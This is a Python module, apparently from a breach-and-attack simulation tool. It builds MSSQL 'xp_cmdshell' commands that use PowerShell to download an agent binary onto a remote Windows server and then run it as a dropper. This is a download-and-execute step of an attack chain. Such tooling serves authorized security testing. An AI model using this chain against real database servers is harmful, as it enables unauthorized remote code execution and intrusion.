import logging
from pathlib import PurePath, PureWindowsPath

from common.command_builder import (
    DownloadMethod,
    DownloadOptions,
    IAgentCommandBuilder,
    MonkeyArgs,
    RunOptions,
    Shell,
)

COMMAND_PREFIX = "xp_cmdshell"
logger = logging.getLogger(__name__)


def build_mssql_agent_download_command(
    agent_download_url: str,
    remote_agent_binary_destination_path: PureWindowsPath,
    agent_command_builder: IAgentCommandBuilder,
) -> str:
    download_options = DownloadOptions(
        agent_destination_path=remote_agent_binary_destination_path,
        download_method=DownloadMethod.WEB_CLIENT,
        download_url=agent_download_url,
        shell=Shell.POWERSHELL,
    )
    command = agent_command_builder.build_download_command(download_options)
    logger.debug(f"COMMAND: {_get_mssql_command(command)}")

    return _get_mssql_command(command)


def build_mssql_agent_launch_command(
    remote_agent_binary_destination_path: PurePath, agent_command_builder: IAgentCommandBuilder
) -> str:
    run_options = RunOptions(
        agent_destination_path=remote_agent_binary_destination_path,
        monkey_args=MonkeyArgs.DROPPER,
        shell=Shell.POWERSHELL,
    )

    command = agent_command_builder.build_run_command(run_options)
    logger.debug(f"RUN COMMAND: {_get_mssql_command(command)}")

    return _get_mssql_command(command)


def _get_mssql_command(command: str) -> str:
    return f"xp_cmdshell '{command}'"
